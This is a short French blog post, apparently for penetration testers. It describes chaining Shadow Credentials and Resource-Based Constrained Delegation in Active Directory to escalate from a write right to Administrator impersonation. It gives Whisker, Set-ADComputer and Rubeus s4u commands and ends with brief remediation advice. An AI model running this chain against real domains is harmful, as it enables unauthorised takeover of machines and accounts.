---
title: "Shadow Credentials & RBCD — la chaîne complète"
description: "Enchaîner Shadow Credentials (msDS-KeyCredentialLink) et Resource-Based Constrained Delegation pour une prise de contrôle propre."
date: 2026-06-04
tags: ["active-directory", "kerberos", "delegation"]
draft: false
---

## Pourquoi les combiner

Shadow Credentials donne une **authentification** sur un objet qu'on peut
écrire ; RBCD transforme un droit d'écriture sur un ordinateur en
**impersonation**. Mis bout à bout, un simple `GenericWrite` devient un
chemin vers SYSTEM.

## Le pipeline

| Étape | Outil | Effet |
|-------|-------|-------|
| Ajouter une clé | Whisker / keycred.exe | s'authentifier comme l'objet |
| Récupérer un TGT | Rubeus | PKINIT -> TGT |
| Poser RBCD | PowerView | déléguer vers l'ordinateur cible |
| Impersonate | Rubeus s4u | TGS pour CIFS/HOST en tant qu'admin |

```powershell
# 1. Shadow Credentials
Whisker.exe add /target:WS01$

# 2. RBCD
Set-ADComputer WS01 -PrincipalsAllowedToDelegateToAccount ATTACKER$

# 3. S4U
Rubeus.exe s4u /user:ATTACKER$ /rc4:<HASH> /impersonateuser:Administrator `
  /msdsspn:cifs/ws01.corp.local /ptt
```

## Garde-fous

Cette chaîne suppose un droit d'écriture initial. Sans lui, rien ne part.
La remédiation côté bleu : restreindre qui peut écrire
`msDS-KeyCredentialLink` et auditer `msDS-AllowedToActOnBehalfOfOtherIdentity`.
